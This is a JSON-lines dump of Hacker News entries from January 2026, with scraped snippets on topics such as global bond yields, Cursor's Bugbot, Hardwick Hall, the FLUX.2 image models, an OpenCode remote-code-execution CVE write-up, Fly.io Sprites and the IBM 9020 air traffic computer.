{"title": "Japan's 40-year bond yield hits 4% record on fiscal jitters", "url": "https://www.cnbc.com/2026/01/20/japan-40-year-jgb-government-bond-yield-record-fiscal-jitters-snap-election-call-takaichi.html", "content": "Japan's 40-year bond yield hits 4% record on fiscal jitters.  U.S. Treasurys and other countries' government bonds continued to sell off on Tuesday, as the White House's rhetoric on tariffs fueled fresh fears of a trade war between the U.S. and Europe. By 6:10 a.m. ET, yields on U.S. Treasury yields hadspiked, particularly at the long end of the maturity curve. The yield on the30-year Treasuryjumped 9 basis points higher to trade at 4.93%, taking it closer to the crucial 5% threshold. Meanwhile, the yield on the benchmark10-year Treasuryadded 6 basis points to settle at around 4.291%. One basis point is equal to 0.01%, and yields and prices move in opposite directions. In Europe, yields also moved higher. The10-year German bund— a benchmark for the euro zone — saw its yield added 4 basis points to 2.8831%, while the yield on30-year bundsadvanced almost 6 basis points to 3.512%. At the same time, U.K. government bonds, known as gilts, saw a sharp sell off, with 30-year gilt yields adding 9 basis points to trade at 5.253% while the benchmark 10-year gilt added 7 basis points. The U.K. currently has the highest long-term government borrowing costs of any G7 nation. Yields on bonds issued by the governments of France, Italy, Switzerland and Australia also ticked higher on Tuesday. \"The basic problem in the global bond market is this: major governments of the major economies are living deficits. They've accumulated a great deal of debt, and investors are starting to demonstrate that they're not happy about that,\" Ed Yardeni, president of Yardeni Research, said. Elswhere, Japan's40-year government bond yieldhit a record high on Tuesday as investors worried that proposed cuts to the food sales tax could worsen the country's fiscal position. The long-dated yield rose nearly 3 basis points to 4.213%, the highest level since the 40-year maturity was introduced.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "A Future for Amiga?", "url": "https://old.reddit.com/r/amiga/comments/1qgpksh/a_future_for_amiga/", "content": "A Future for Amiga?. use the following search parameters to narrow your results: e.g.subreddit:aww site:imgur.com dog see the search faq for details. advanced search: by author, subreddit... We are a passionate community of Amiga fans. We talk about relevant news, events, new and old hardware and software and all things Commodore Amiga - one of the greatest home computer platforms of all-time. Amiga Directory Full rule details the front page of the internet. and join one of thousands of communities. ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Map To Poster – Create Art of your favourite city", "url": "https://github.com/originalankur/maptoposter", "content": "Map To Poster – Create Art of your favourite city", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Building a better Bugbot", "url": "https://cursor.com/blog/building-bugbot", "content": "Building a better Bugbot. As coding agents became more capable, we found ourselves spending more time on review. To solve this, we builtBugbot, a code review agent that analyzes pull requests for logic bugs, performance issues, and security vulnerabilities before they reach production. By last summer, it was working so well that we decided toreleaseit to users. The process of building Bugbot began with qualitative assessments and gradually evolved into a more systematic approach, using a custom AI-driven metric to hill-climb on quality. Since launch, we have run 40 major experiments that have increased Bugbot's resolution rate from 52% to over 70%, while lifting the average number of bugs flagged per run from 0.4 to 0.7. This means that the number of resolved bugs per PR has more than doubled, from roughly 0.2 to about 0.5. When we first tried to build a code review agent, the models weren't capable enough for the reviews to be helpful. But as the baseline models improved, we realized we had a number of ways to increase the quality of bug reporting. We experimented with different configurations of models, pipelines, filters, and clever context management strategies, polling engineers internally along the way. If it seemed one configuration had fewer false positives, we adopted it. One of the most effective quality improvements we found early on was running multiple bug-finding passes in parallel and combining their results with majority voting. Each pass received a different ordering of the diff, which nudged the model toward different lines of reasoning. When several passes independently flagged the same issue, we treated it as a stronger signal that the bug was real. After weeks of internal qualitative iterations, we landed on a version of Bugbot that outperformed other code review tools on the market and gave us confidence to launch. It used this flow: To make Bugbot usable in practice, we had to invest in a set of foundational systems alongside the core review logic. That included making repository access fast and reliable by rebuilding our Git integration in Rust and minimizing how much data we fetched, as well as adding rate-limit monitoring, request batching, and proxy-based infrastructure to operate within GitHub's constraints. As adoption grew, teams also needed a way to encode codebase-specific invariants like unsafe migrations or incorrect use of internal APIs. In response, we addedBugbot rulesto support those checks without hardcoding them into the system. Together, these pieces made Bugbot practical to run and adaptable to real codebases. But they didn't tell us whether quality was actually improving. Without a metric to measure progress, we couldn't quantitatively assess Bugbot's performance in the wild, and that put a ceiling on how far we could push it.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Ask HN: How can we solve the loneliness epidemic?", "url": "item?id=46635345", "content": "Ask HN: How can we solve the loneliness epidemic?", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "An Elizabethan mansion's secrets for staying warm", "url": "https://www.bbc.com/future/article/20260116-an-elizabethan-mansions-secrets-for-staying-warm", "content": "An Elizabethan mansion's secrets for staying warm. In a bleak, deadly period of cold weather known as the Little Ice Age, clever Elizabethan designs helped keep a magnificent stately home unusually warm. The house has lessons for how we can heat our homes more efficiently today. England's longest river was usually flowing freely. But on New Year's Eve in 1564,the River Thames was frozen solid, from bank to bank. Bonfires crackled on the stuck-fast surface, oxen roasted on spits, and people danced on the ice.Some accounts saythat Queen Elizabeth I even practised archery on the glacial river. This sort of thing wasn't a one off. It had happened before: King Henry VIII and his queen had dashed downriver in a sleigh nearly three decades previously in 1537. These frosty conditions were the result of a climatic plot twistroughly between the 14th and 19th centuries, known today as the Little Ice Age. As wellas festivals on the ice, this prolonged cold period brought periods offamine, and frightening unseasonable frosts. Soldiersfroze to death in the middle of the European summer. The cold forced Europeans to develop new ways of coping with extreme weather. One of the best-studied examples of architectural adaptation is Hardwick Hall in Derbyshire, England – a building whose design is a carefully choreographed effort to keep as warm as possible. The same tricks for more efficient heating can be used in modern designs, helping reduce our reliance on fossil fuels today. And they can even inspire small changes in our existing homes to keep temperatures cosier through the winter without turning up the thermostat. I drive the long, meandering driveway uphill to the house, confronted by the occasional long-horn cattle grazing between leafless oak trees. At the crest of the hill, I'm met with a striking sight: not one hall, but two. Hardwick \"old\" Hall is massive, despite its ruinous state. I can tell it's been repeatedly extended over the years, as the bricks are misaligned at the joins of each extension and the windows are mismatched in style and size across the facade. What caused the Little Ice Age? It appears there's no single cause of the Little Ice Age, but a deadly and complex combination.Scientists have found evidenceforreduced solar activity,increased volcanic eruptions,changes in ocean circulationandthe natural fluctuations within the global climate system. In addition, the arrival of the Europeans in North America in the late 15th Century led to an estimated56 million deaths of indigenous peoples, resulting in widespread abandonment of farming and regrowth of forests. More trees mean less planet-warming gases were circulating in the atmosphere, reducing the global average temperature. Hardwick \"new\" Hall is a few dozen metres away. This pale yellow manor was built in the1590sand is eye-pleasingly symmetrical, complete with three-story turrets and huge expanses of glass. Whoever quipped at the time of its construction that it was \"more window than wall\" was right. It is a magnificent display of wealth, built in a time whenglass was extremely expensive.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "FLUX.2 [Klein]: Towards Interactive Visual Intelligence", "url": "https://bfl.ai/blog/flux2-klein-towards-interactive-visual-intelligence", "content": "FLUX.2 [Klein]: Towards Interactive Visual Intelligence. Today, we release the FLUX.2 [klein] model family, our fastest image models to date. FLUX.2 [klein] unifies generation and editing in a single compact architecture, delivering state-of-the-art quality with end-to-end inference as low as under a second. Built for applications that require real-time image generation without sacrificing quality, and runs on consumer hardware with as little as 13GB VRAM. Try it now for free here Demo showing editing with FLUX.2 [klein] Visual Intelligence is entering a new era. As AI agents become more capable, they need visual generation that can keep up; models that respond in real-time, iterate quickly, and run efficiently on accessible hardware. Thekleinname comes from the German word for \"small\", reflecting both the compact model size and the minimal latency. But FLUX.2 [klein] is anything but limited. These models deliver exceptional performance in text-to-image generation, image editing and multi-reference generation, typically reserved for much larger models. Note: The “FLUX [dev] Non-Commercial License” has been renamed to “FLUX Non-Commercial License” and will apply to the 9B Klein models. No material changes have been made to the license. Text to Image collage using FLUX.2 [klein] Our flagship small model. Defines the Pareto frontier for quality vs. latency across text-to-image, single-reference editing, and multi-reference generation. Matches or exceeds models 5x its size - in under half a second. Built on a 9B flow model with 8B Qwen3 text embedder, step-distilled to 4 inference steps. Combine multiple input images, blend concepts, and iterate on complex compositions - all at sub-second speed with frontier-level quality. No model this fast has ever done this well. License: FLUX NCL", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: TinyCity – A tiny city SIM for MicroPython (Thumby micro console)", "url": "https://github.com/chrisdiana/TinyCity", "content": "Show HN: TinyCity – A tiny city SIM for MicroPython (Thumby micro console)", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "All your OpenCodes belong to us", "url": "https://johncodes.com/archive/2026/01-18-all-your-opencodes/", "content": "All your OpenCodes belong to us. Recently,OpenCode, a very popular open source AI coding agent,\nwas hit witha massive CVEwhich allowed for arbitrary remote code execution (RCE). If you’re unfamiliar with cyber-security, penetration testing, red-teaming,\nor the murky world of building secure software, a RCE vulnerability is the type of thing that\nnation state actors in Russia and North Korea dream of.\nIn theory, it allows an attacker to executeanycode on a system they’ve gained access to,\neffectively pwning the entire system and allowing them to install backdoors, crypto miners,\nor do whatever else they want. When I worked onBottlerocket,\na Linux based operating system purpose built for\nsecurely running container workloads, we took even the whisper of an RCE extremely seriously.I remember working a few long nights in order to fix a possible RCE attack we were exposed to by openssl.\nThe way this attack worked was through a specially crafted email address in an X.509 cert from a client.\nThis could in theory cause a buffer overflow which could allow for an attacker to execute remote\ncode injected in the cert (which would have been loaded into memory).\nThis would require a meticulously crafted X.509 cert\nwith the specially crafted email address and perfect buffer overflow into the malicious code within the cert.\nNot easy by any means! At the time, the main attack surface area was not actually Bottlerocket itself\nbut in theBottlerocket-update-operatorwhich is a Kubernetes operator for upgrading\non-cluster Bottlerocket nodes to the latest version as we rolled releases.\nThe operator had a server which would connect to node daemons in order to initiate an upgrade:\nthis server / client connection on the cluster would be secured through mTLS with\ncerts verified by the server and client via openssl.\nIn short,thisis exactly where\nan attacker would have to inject a malicious X.509 cert.\nAlready having gained\naccess to the cluster and the internal Kubernetes network, an attacker would need to send a payload to the operator’s server.\nWe debated if this was even feasible for an attacker to exploit the operator’s system in this way:\ntheoretically, the attacker would have to get on the cluster, access the operator’s namespace and network,\nlaunch some sort of foothold, like a pod, and then send a malicious payload. Ultimately, the stakes just seemed too high: it wasn’t worth the risk to leave unfixed for any amount of time\nand we wanted to be “customer obsessed” by swiftly patching this, removing any question of an exploit being possible.\nFurther, we encouraged customers to have audit trails and telemetry on the operator system\nin order to be assured no malicious action was taking place,\nsomething many customers already had instrumented. Now that you have an idea of how intense an RCE vulnerability can be and how nuanced they often are,\nlet’s look at the OpenCode one.\nYou’ll immediately realize it’s significantly more dangerous,\nmuch, much easier to exploit, and far less nuanced. Versions of OpenCode before v1.1.10 allowed for any code to be executed via its HTTP\nserver which exposed a wide openPOST /session/:id/shellfor executing arbitrary\nshell commands,POST /ptyfor creating new interactive terminal sessions,\nandGET /file/contentfor reading any arbitrary file. Yikes! Check outVladimir Panteleev’soriginal, excellentresearch and disclosure on this CVE.\nGreat write up! First, let’s get the whole thing setup so we can run the vulnerable server\n(if following along, all of the following commands are performed\nin a sandboxed virtual machine - take extreme caution when playing around\nwith software that has an RCE!!!): At this point, OpenCode comes up and I see the prompt with“Ask anything… ”.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "List of individual trees", "url": "https://en.wikipedia.org/wiki/List_of_individual_trees", "content": "List of individual trees.  Download coordinates as: The following is alist of individual trees.Treeslisted here are regarded as important or specific by their historical, national, locational, natural or mythological context. The list includes actualtreeslocated throughout the world, as well astrees from myths and religions. or Sindora wallichii 35°14′18″N 58°27′56″E (genusPopulus) 56.073667, -4.335500 41° 35′ 53.2″ N, 23° 47′ 55.13″ E Заградски чинар[1]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Keifu – A TUI for navigating commit graphs with color and clarity", "url": "https://github.com/trasta298/keifu", "content": "Keifu – A TUI for navigating commit graphs with color and clarity", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "CD Projekt issue DMCA takedown notice against popular Cyberpunk VR mod", "url": "https://www.patreon.com/posts/another-one-dust-148437771", "content": "CD Projekt issue DMCA takedown notice against popular Cyberpunk VR mod", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Sparrow-1 – Audio-native model for human-level turn-taking without ASR", "url": "https://www.tavus.io/post/sparrow-1-human-level-conversational-timing-in-real-time-voice", "content": "Show HN: Sparrow-1 – Audio-native model for human-level turn-taking without ASR", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Social Media Without Socializing", "url": "https://pluralistic.net/2026/01/19/billionaire-solipsism/#sirius-cybernetics", "content": "Social Media Without Socializing.    From the earliest days of social media, social media bosses have been at war with sociability. To create a social media service is to demarcate legitimate and illegitimate forms of sociability. It's a monumental act of hubris, really. It was ever thus. The founder of Friendster decreed that people could only form friendship bonds with each other, but could not declare themselves to be \"friends\" of everyone with a common interest. You and I could be friends, but you couldn't be \"friends\" with a group called \"bloggers.\" Each member of that group would have to create a reciprocal friendship link to see one another's feeds. Way back in 1999, Larry Lessig taught us that \"code is law.\" By encoding these restrictions into the feed, Friendster's programmers were putting limits on the kinds of relationships that could be formed using the service. But Lessig's law (code?) is often overidden by an even older principle: William Gibson's 1982 maxim that \"the street finds its own uses for things.\" Friendster told its users how to be friends with one another, and Friendster's users treated Friendster's management as damage and routed around it. They created accounts with names like \"New York City\" and whenever anyone friended that account, it friended them back. Users hacked their own way to form \"illegitimate\" friendships based on affinity into the system: https://www.zephoria.org/thoughts/archives/2003/08/17/the_fakester_manifesto.html As social media turned into a billion- (and then a trillion-) dollar business, the urgency of the struggle between how social media bosses demanded that we socialize and how we wanted to socialize only got sharper. Mark Zuckerberg doubtless thought he was covering all his bases when he tossed a casual \"It's complicated\" to the pulldown menu for defining your relationship status, but that's because he doesn't understand how complicatedallour relationships are: https://www.phillymag.com/news/2013/07/10/facebook-complicated-relationship-status/", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Data Activation Thoughts", "url": "https://galsapir.github.io/sparse-thoughts/2026/01/17/data_activation/", "content": "Data Activation Thoughts. © 2026. All rights reserved. The landscape is shifting in recent years — it’s a cliche to start texts like this these days, but the fact that it’s a cliche doesn’t make it any less true.1In 2019, the folks at Andreessen Horowitz wrote this about data (in a piece titledThe Empty Promise of Data Moats): “Instead of getting stronger, the defensible moat erodes as the data corpus grows and the competition races to catch up.” (Trying to prove some data has value — I’ve experienced it firsthand.) LLMs have shifted where value comes from. It’s no longer enough to simply have proprietary data; what matters now is how effectively you can make that data useful to these systems (and therefore, to anything else that lives off that). So, if traditional data moats are eroding, the new competitive edge lies in dataactivation. The pressing question becomes:how quickly can you connect your proprietary data to LLMs in ways that demonstrably improve their performance(before someone else figures out how to replicate your insights without your data)? Before we continue I want to think about a simple metaphor here — LLMs caningestthe data. They’ll happily consume every row and column you throw at them. But (and this is important) without the right transformation, they can’tmetabolizeit. The nutritional value passes through unabsorbed. They’re missing the “enzymes” I guess you can call it. Data activation is about providing those enzymes: converting raw information into a form the model can actually digest and turn into acapability. Looking specifically at healthcare data, the opportunity is immense — and let’s face it, time limited. Looking at OpenAI’sreportfrom January 2026: more than 5% of all ChatGPT messages globally are healthcare-related. 25% of weekly active users ask health-related questions. More than 40 million people turn to ChatGPTdailyfor healthcare guidance (!!!). The big labs are clearly taking notice: within the span of a single week (January 2026), OpenAI launched “ChatGPT for Healthcare” (already rolling out to institutions like Cedars-Sinai, Memorial Sloan Kettering, and Stanford Medicine) and Anthropic announced “Claude for Healthcare” with HIPAA-ready infrastructure and native integrations to medical databases/ontologies (CMS Coverage Database, ICD-10, PubMed). To me, it looks like healthcare is now a primary battleground for frontier AI companies.2 Yet, if you look at the numbers from OpenRouter, they claim that health remains “the most fragmented of the top categories”. What does this mean? According to OpenRouter, it signals both the domain’s complexity and the inadequacy of current general-purpose models. It seems that recent research already demonstrates that the bridge between structured medical data and improvements in LLM reasoning is working. Tables2Tracesestablished a framework for converting raw, tabular patient-level data into contrastive reasoning traces that can be used for LLM fine-tuning. They tried to “mirror how a clinician would think” — what they did is pretty simple. For every patient record, they identified similar patients with different outcomes (someone similar who died and someone similar who survived). Once they had those triplets of patients they prompted a strong LLM to generate explanations for the divergence. These reasoning traces become fine-tuning data for smaller models. For their specific use-case they showed significant improvement (>17% in domain-specific MedQA and even generalization capabilities — they trained only on cardiovascular cases but noted improvement in other areas of medicine as well). The paper’s “simple vs. full” comparison also provides empirical evidence: naively converting tables to patient narratives doesn’t work (and can hurt performance). So the models actually need the structured reasoning scaffold — the contrastive comparison, together with the reasoning and quasi-counterfactual thinking, is what makes the difference.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Things I learned from burning myself out with AI coding agents", "url": "https://arstechnica.com/information-technology/2026/01/10-things-i-learned-from-burning-myself-out-with-ai-coding-agents/", "content": "Things I learned from burning myself out with AI coding agents. If you’ve ever used a 3D printer, you may recall the wondrous feeling when you first printed something you could have never sculpted or built yourself. Download a model file, load some plastic filament, push a button, and almost like magic, a three-dimensional object appears. But the result isn’t polished and ready for mass production, and creating a novel shape requires more skills than just pushing a button. Interestingly, today’sAI coding agentsfeel much the same way. Since November, I have usedClaude Codeand Claude Opus 4.5 through a personal Claude Max account to extensively experiment with AI-assisted software development (I have also used OpenAI’sCodexin a similar way, though not as frequently). Fifty projects later, I’ll be frank: I have not had this much fun with a computer since I learned BASIC on myApple II Pluswhen I was 9 years old. This opinion comes not as an endorsement but as personal experience: I voluntarily undertook this project, and I paid out of pocket for both OpenAI and Anthropic’s premium AI plans. Throughout my life, I have dabbled in programming as a utilitarian coder, writing small tools or scripts when needed. In my web development career, I wrote some small tools from scratch, but I primarily modified other people’s code for my needs. Since 1990, I’ve programmed in BASIC, C, Visual Basic, PHP, ASP, Perl, Python, Ruby, MUSHcode, and some others. I am not an expert in any of these languages—I learned just enough to get the job done. I have developed my own hobby games over the years using BASIC, Torque Game Engine, and Godot, so I have some idea of what makes a good architecture for a modular program that can be expanded over time. Claude Code, Codex, and Google’sGemini CLI, can seemingly perform software miracles on a small scale. They can spit out flashy prototypes of simple applications, user interfaces, and even games, but only as long as they borrow patterns from their training data. Much like a 3D printer, doing production-level work takes far more effort. Creating durable production code, managing a complex project, or crafting something truly novel still requires experience, patience, and skill beyond what today’s AI agents can provide on their own. And yet these tools have opened a world of creative potential in software that was previously closed to me, and they feel personally empowering. Even with that impression, though, I know these are hobby projects, and the limitations of coding agents lead me to believe that veteran software developers probably shouldn’t fear losing their jobs to these tools any time soon. In fact, they may become busier than ever. So far, I have created over 50 demo projects in the past two months, fueled in part by a bout of COVID that left me bedridden with a laptop and a generous 2x Claude usage cap that Anthropic put in place during the last few weeks of December. As I typed furiously all day, my wife kept asking me, “Who are you talking to?” You can see a few of the more interesting resultslistedon my personal website. Here are 10 interesting things I’ve learned from the process. Even with the best AI coding agents available today, humans remain essential to the software development process. Experienced human software developers bring judgment, creativity, and domain knowledge that AI models lack. They know how to architect systems for long-term maintainability, how to balance technical debt against feature velocity, and when to push back when requirements don’t make sense. For hobby projects like mine, I can get away with a lot of sloppiness. But for production work, having someone who understands version control, incremental backups, testing one feature at a time, and debugging complex interactions between systems makes all the difference. Knowing something about how good software development works helps a lot when guiding an AI coding agent—the tool amplifies your existing knowledge rather than replacing it. As independent AI researcher Simon Willisonwrotein a post distinguishing serious AI-assisted development from casual “vibe coding,” “AI tools amplify existing expertise. The more skills and experience you have as a software engineer the faster and better the results you can get from working with LLMs and coding agents.”", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Echo Chess: The Quest for Solvability (2023)", "url": "https://web.archive.org/web/20230920164939/https://samiramly.com/chess", "content": "Echo Chess: The Quest for Solvability (2023). This story has stirredsome great conversations on Hacker News. Many have reached out with great ideas for a v2. If you still want to chime in, just drop me a note. Let’s make Chess more fun in Single-Player. How hard could it be? ☠️ This is the story of venturing too deep, head-first, into the unknown. It all started with a doodle on a piece of paper. This doodle to be exact. I first conceived of this game on a whim as part of many strategy and puzzle games I’d been designing for fun. I was musing with the idea of a chess-inspired Turn-Based Strategy (TBS) game that no one would recognize as chess-based. My first attempts purposefully kept steering the theme away from chess. Why go vanilla when there are so many wilder thematic flavors and bolder mechanics to explore? Asymmetric rewards, alternating movement rules, stochastic obstacles, stealth, morphing, etc. A wise friend and fellow strategy game nerd* then said to me: The game’s dope. But what’s wrong with people associating it with Chess? No need to innovate that kernel away - their mental load would be taken up by re-learning how to move. Chess pieces are a universal language. They help them overcome the activation energy and figure out what’s going on. So I re-designed the rules, mechanics, and first few levels witha sharpie and a whiteboardFigma and a LLaMAsandwich paper and a pencil. Then I started testing it with friends by setting up this old wooden board I found in storage. Soon “the game” looked more like this. Something surprising started happening quickly. Anyone who tried the game got hooked. People would keep coming back trying to beat levels they couldn’t solve. They’d ask me to manually reset the board to specific checkpoints in a puzzle so they could try again. Chess masters and n00bs alike would describe feeling a rush of excitement every time they’d reach the ‘Aha’ moment of a maze. Then people wanted to play “the game” at home and show it totheirfriends. I’d send them photos of my scribbled level designs so they could reproduce them on their own with a physical chess board or something likelichess. One day I just figured this was getting comically unsustainable. So I decided to build “the game” into a proper thing online and call itEcho Chess.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Resonant Computing Manifesto", "url": "https://resonantcomputing.org/", "content": "The Resonant Computing Manifesto. There's a feeling you getin the presence ofbeautiful buildings and bustling courtyards.A sense that these spacesare inviting you to slow down,deepen your attention, and bea bit more human.What if our software could do the same? We shape our environments, and thereafter they shape us. Great technology does more than solve problems. It weaves itself into the world we inhabit. At its best, it can expand our capacity, our connectedness, our sense of what's possible. Technology can bring out the best in us. Our current technological landscape, however, does the opposite. Feeds engineered to hijack attention and keep us scrolling, leaving a trail of anxiety and atomization in their wake. Digital platforms that increasingly mediate our access to transportation, work, food, dating, commerce, entertainment—while routinely draining the depth and warmth from everything they touch. For all its grandiose promises, modern tech often leaves us feeling alienated, ever more distant from who we want to be. The people who build these products aren't bad or evil. Most of us got into tech with an earnest desire to leave the world better than we found it. But the incentives and cultural norms of the tech industry have coalesced around the logic of hyper-scale. It's become monolithic, magnetic, all-encompassing—an environment that shapes all who step foot there. While the business results are undeniable, so too are the downstream effects on humanity. With the emergence of artificial intelligence, we stand at a crossroads. This technology holds genuine promise. It could just as easily pour gasoline on existing problems. If we continue to sleepwalk down the path of hyper-scale and centralization, future generations are sure to inherit a world far more dystopian than our own. But there is another path opening before us. Christopher Alexander spent his career exploring why some built environments deaden us, while others leave us feeling more human, more at home in the world. His work centered around the \"quality without a name,\" this intuitive knowing that a place or an architectural element is in tune with life. By learning to recognize this quality, he argued, and constructing a building in dialogue with it, we could reliably create environments that enliven us. We call this qualityresonance. It's the experience of encountering something that speaks to our deeper values. It's a spark of recognition, a sense that we're being invited to lean in, to participate. Unlike the digital junk food of the day, the more we engage with what resonates, the more we're left feeling nourished, grateful, alive. As individuals, following the breadcrumbs of resonance helps us build meaningful lives. As communities, companies, and societies, cultivating shared resonance helps us break away from perverse incentives, and play positive-sum infinite games together. For decades, technology has required standardized solutions to complex human problems. In order to scale software, you had to build for the average user, sanding away the edge cases. In many ways, this is why our digital world has come to resemble the sterile, deadening architecture that Alexander spent his career pushing back against.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "U.S. Court Order Against Anna's Archive Spells More Trouble for the Site", "url": "https://torrentfreak.com/u-s-court-order-against-annas-archive-spells-more-trouble-for-the-site/", "content": "U.S. Court Order Against Anna's Archive Spells More Trouble for the Site. Anna’s Archivehas had its fair share ofdomain troublesover the past two weeks. First, the site lost control over its original annas-archive.org domain after the U.S.-based Public Interest Registry (PIR) placed it onserverHold. PIR typically only takes these kinds of measures based on a court order. However, when we asked for more details, the registryinformed usthat it was “unable to comment on the situation at this time,” only adding to the mystery. A few days ago, the domain trouble continued when Anna’s Archive’s .SE domain suddenly became unresponsive after being operational for years. For this domain, the registrar took action, as the site was put onclientHold. While we tried to get additional information from the registrar, our requests remained unanswered. While it is clear that ‘something’ is going on, it’s not clear what. The troubles started not long after Anna’s Archive announced that it hadbacked up Spotify, but there is no concrete link to a music industry push against the site. What we do know for certain is that Anna’s Archive’s troubles are not over yet. Yesterday, a federal court in Ohio issued a default judgment and permanent injunction against the site’s unidentified operator(s). This order was requested by OCLC, which owns the proprietary WorldCat database that wasscraped and publishedby Anna’s Archive more than two years ago. OCLC initially demanded millions of dollars in damages but eventually dropped this request, focusing on taking the site down through an injunction that would also apply to intermediaries. “Anna’s Archive’s flagrantly illegal actions have damaged and continue to irreparably damage OCLC. As such, issuance of a permanent injunction is necessary to stop any further harm to OCLC,” the request read. This pivot makes sense since Anna’s Archive did not respond to the lawsuit and would likely ignore all payment demands too. However, with the right type of court order, third-party services such as hosting companies and domain registrars might come along. The permanent injunction, issued by U.S. District Court Judge Michael Watson yesterday, does not mention any third-party services by name. However, it is directed at all parties that are “in active concert and participation with” Anna’s Archive.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Design and Implementation of Sprites", "url": "https://fly.io/blog/design-and-implementation/", "content": "Design and Implementation of Sprites. We’re Fly.io, and this is the place in the post where we’d normally tell you that our job is totake your containers and run them on our own hardwareall around the world. But last week, welaunched Sprites, and they don’t work that way at all. Sprites are something new: Docker without Docker without Docker. This post is about how they work. Replacement-level homeowners buy boxes of pens and stick them in “the pen drawer”. What the elites know: you have to think adversarially about pens. “The purpose of a system is what it does”; a household’s is to uniformly distribute pens.  Months from now, the drawer will be empty, no matter how many pens you stockpile. Instead, scatter pens every place you could possibly think to look for one — drawers, ledges, desks. Any time anybody needs a pen, several are at hand, in exactly the first place they look. This is the best way I’ve found to articulate the idea ofSprites, the platform we just launched at Fly.io. Sprites are ball-point disposable computers. Whatever mark you mean to make, we’ve rigged it so you’re never more than a second or two away from having a Sprite to do it with. Sprites are Linux virtual machines. You get root. Theycreatein just a second or two: so fast, the experience of creating and shelling into one is identical to SSH'ing into a machine that already exists. Sprites all have a 100GB durable root filesystem. They put themselves to sleep automatically when inactive, and cost practically nothing while asleep. As a result, I barely feel the need to name my Sprites. Sometimes I’ll just typesprite create dkjsdjkand start some task. People at Fly.io who use Sprites have dozens hanging around. There aren’t yet many things in cloud computing that have the exact shape Sprites do: This is a post about how we managed to get this working. We created a new orchestration stack that undoes some of the core decisions we made forFly Machines, our flagship product. Turns out, these new decisions make Sprites drastically easier for us to scale and manage. We’re pretty psyched. Lucky for me, there happen to be threebig decisionswe made that get you 90% of the way from Fly Machines to Sprites, which makes this an easy post to write. So, without further ado: This is the easiest decision to explain. Fly Machines are approximatelyOCI containers repackaged as KVM micro-VMs. They have the ergonomics of Docker but the isolation and security of an EC2 instance. We love them very much and they’re clearly the wrong basis for a ball-point disposable cloud computer.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Air traffic control: the IBM 9020", "url": "https://computer.rip/2026-01-17-air-traffic-control-9020.html", "content": "Air traffic control: the IBM 9020. Previously onComputers Are Bad,we discussed theearly history of air\ntraffic control in the United States.\nThe technical demands of air traffic control are well known in computer history\ncircles because of the prominence of SAGE, but what's less well known is that\nSAGE itself was not an air traffic control system at all. SAGE was an airdefensesystem, designed for the military with a specific task of ground-controlled\ninterception (GCI). There is natural overlap between air defense and air\ntraffic control: for example, both applications require correlating aircraft\nidentities with radar targets. This commonality lead the Federal Aviation Agency\n(precursor to today's FAA) to launch a joint project with the Air Force to\nadapt SAGE for civilian ATC. There are also significant differences. In general, SAGE did not provide any\nsafety functions. It did not monitor altitude reservations for uniqueness,\nit did not detect loss of separation, and it did not integrate instrument\nprocedure or terminal information. SAGE would need to gain these features to\nmeet FAA requirements, particularly given the mid-century focus on\nmid-air collisions (a growing problem, with increasing air traffic, that SAGE\ndid nothing to address). The result was a 1959 initiative called SATIN, for SAGE Air Traffic Integration.\nAround the same time, the Air Force had been working on a broader enhancement\nprogram for SAGE known as the Super Combat Center (SCC). The SCC program was\nseveral different ideas grouped together: a newer transistorized computer to\nhost SAGE, improved communications capabilities, and the relocation of Air\nDefense Direction Centers from conspicuous and vulnerable \"SAGE Blockhouses\"\nto hardened underground command centers, specified as an impressive 200 PSI\nblast overpressure resistance (for comparison, the hardened telecommunication\nfacilities of the Cold War were mostly specified for 6 or 10 PSI). At the program's apex, construction of the SCCs seemed so inevitable that the\nAir Force suspended the original SAGE project under the expectation that SCC\nwould immediately obsolete it. For example, my own Albuquerque was one of the\nlast Air Defense Sectors scheduled for installation of a SAGE computer. That\ninstallation was canceled; while a hardened underground center had never\nbeen in the cards for Albuquerque, the decision was made to otherwise build\nAlbuquerque to the newer SCC design, including the transistorized computer.\nBy the same card, the FAA's interest in a civilian ATC capability, and thus\nthe SATIN project, came to be grouped together with the SCC program as just\nanother component of SAGE's next phase of development. SAGE had originally been engineered by MIT's Lincoln Laboratory, then the\nnational center of expertise in all things radar. By the late 1950s a\nlarge portion of the Lincoln Laboratory staff were working on air defense\nsystems and specifically SAGE. Those projects had become so large that\nMIT opted to split them off into a new organization, which through some\nobscure means came to be called the MITRE Corporation. MITRE was to be a\ngeneral military R&D and consulting contractor, but in its early years it\nwas essentially the SAGE company. The FAA contracted MITRE to deliver the SATIN project, and MITRE subcontracted\nsoftware to the Systems Development Corporation, originally part of RAND and\namong the ancestors of today's L3Harris. For the hardware, MITRE had long\nused IBM, who designed and built the original AN/FSQ-7 SAGE computer and\nits putative transistorized replacement, the AN/FSQ-32. MITRE began a\nseries of engineering studies, and then an evaluation program on prototype\nSATIN technology. There is a somewhat tenuous claim that you will oft see repeated, that the\nAN/FSQ-7 is the largest computer ever built. It did occupy the vast majority\nof the floorspace of the four-story buildings built around it. The power\nconsumption was around 3 MW, and the heat load required an air conditioning\nsystem at the very frontier of HVAC engineering (you can imagine that nearly\nall of that 3 MW had to be blown out of the building on a continuing basis).\nOne of the major goals of the AN/FSQ-32 was reduced size and power consumption,\nwith the lower heat load in particular being a critical requirement for\ninstallation deep underground. Of course, the \"deep underground\" part more\nthan wiped out any savings from the improved technology. By the late 1950s, enormous spending 